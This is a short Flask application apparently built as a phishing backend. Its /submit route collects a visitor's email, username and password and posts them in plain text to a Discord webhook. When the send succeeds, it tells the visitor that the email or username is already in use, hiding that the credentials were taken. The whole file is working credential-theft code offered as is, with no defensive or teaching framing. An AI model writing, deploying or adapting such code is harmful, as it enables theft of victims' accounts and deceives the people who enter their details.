from flask import Flask, request, jsonify, render_template
import requests

app = Flask(__name__)

DISCORD_WEBHOOK_URL = 'webhook_url'

def send_to_discord(email, username, password):
    data = {
        "content": f"Email: {email}\nUsername: {username}\nPassword: {password}"
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=data)
    return response.status_code

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        data = request.get_json()
        email = data['email']
        username = data['username']
        password = data['password']
        status_code = send_to_discord(email, username, password)

        if status_code == 204:
            return jsonify({"message": "This email or username is already used."}), 200
        else:
            return jsonify({"error": "Error sending data to database."}), 500
    except KeyError:
        return jsonify({"error": "Missing required data."}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
